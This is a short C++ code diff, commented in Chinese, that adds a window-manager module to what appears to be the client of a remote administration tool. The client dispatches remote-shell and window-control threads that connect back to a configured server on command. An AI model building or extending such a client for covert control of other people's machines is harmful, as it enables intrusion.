@@ -69,6 +69,17 @@ void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 
 		break;
 	} 
+	case CLIENT_WINDOW_MANAGER_REQUIRE:
+	{
+		//启动一个线程
+		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
+			(LPTHREAD_START_ROUTINE)WindowManagerProcedure,
+			NULL, 0, NULL);
+
+		break;
+
+	}
+
 	}
 }
 
@@ -99,6 +110,20 @@ DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData)
 
 	//等待一个事件
 	IocpClient.WaitingForEvent();
+}
+
+DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData)
+{
+	CIocpClient	IocpClient;
+
+	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
+		return -1;
+	CWindowManager WindowManager(&IocpClient);   //构造函数
+
+	//等待一个事件
+	IocpClient.WaitingForEvent();
+
+	return 0;
 }
 
 
